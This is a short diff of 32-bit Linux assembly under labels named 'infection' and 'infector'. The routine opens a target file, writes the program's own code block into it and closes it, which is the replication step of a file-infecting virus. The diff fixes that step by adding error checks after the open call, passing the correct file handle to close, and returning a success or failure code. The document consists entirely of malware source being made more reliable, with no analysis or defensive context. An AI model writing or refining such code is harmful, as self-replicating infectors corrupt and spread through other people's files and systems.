@@ -63,7 +63,10 @@ infection:
 infector:
     push ebp
     mov ebp, esp
-    pushad
+    push ebx
+    push ecx
+    push edx
+    push esi
 
     mov eax, 5
     mov ebx, [ebp+8]
@@ -71,6 +74,10 @@ infector:
     mov edx, 420
     int 0x80
 
+    cmp eax, 0
+    jl .infector_fail
+
+    mov esi, eax
     mov ebx, eax
     mov eax, 4
     mov ecx, code_start
@@ -79,11 +86,22 @@ infector:
     int 0x80
 
     mov eax, 6
+    mov ebx, esi
     int 0x80
 
-    popad
+    mov eax, 0
+
+.infector_done:
+    pop esi
+    pop edx
+    pop ecx
+    pop ebx
     pop ebp
     ret
+
+.infector_fail:
+    mov eax, -1
+    jmp .infector_done
 
 code_end:
 
